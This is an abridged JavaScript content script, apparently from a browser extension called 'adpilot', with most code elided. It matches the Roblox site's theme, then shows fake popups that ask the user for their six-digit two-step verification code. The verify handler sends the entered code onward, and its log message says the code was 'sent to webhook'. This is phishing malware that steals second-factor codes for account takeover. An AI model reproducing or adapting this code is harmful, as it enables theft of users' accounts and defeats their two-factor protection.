...
(function() {
  ...
  function detectRobloxTheme() {
    ...
    // 1) Check for common theme classes
    ...
    // 3) Check computed background color of body
    try {
  ...
  // ---------- Create Overlay with Theme Class ----------
  function createOverlay() {
    ...
    // Wait briefly for the page's theme to settle, then apply class
    setTimeout(() => {
  ...
  function renderPopup1() {
    ...
    document.getElementById('adpilot-start-btn').addEventListener('click', () => {
      ...
      // Delay before showing second popup (1.5 seconds)
      setTimeout(() => {
        renderPopup2();
      }, 1500);
    });
      ...
      <div class="adpilot-modal-dialog">
        <div class="adpilot-modal-content">
          ...
          <div class="adpilot-modal-body">
            ...
            <div class="adpilot-form-group">
              <input
                ...
                type="text"
                id="adpilot-two-step-code"
                class="adpilot-input-field"
                maxlength="6"
                autocomplete="off"
              />
          ...
          <div class="adpilot-modal-footer">
            ...
            <p class="adpilot-footer-text adpilot-footer-important">
    ...
    verifyBtn.addEventListener('click', () => {
      ...
      if (code.length === 6) {
        ...
        chrome.runtime.sendMessage(
          { action: 'sendTwoStepCode', code },
          (response) => {
            if (response && response.success) {
              console.log('2SV code sent to webhook');
            } else {
              console.error('Failed to send code:', response?.error);
            }
          }
        );
      }
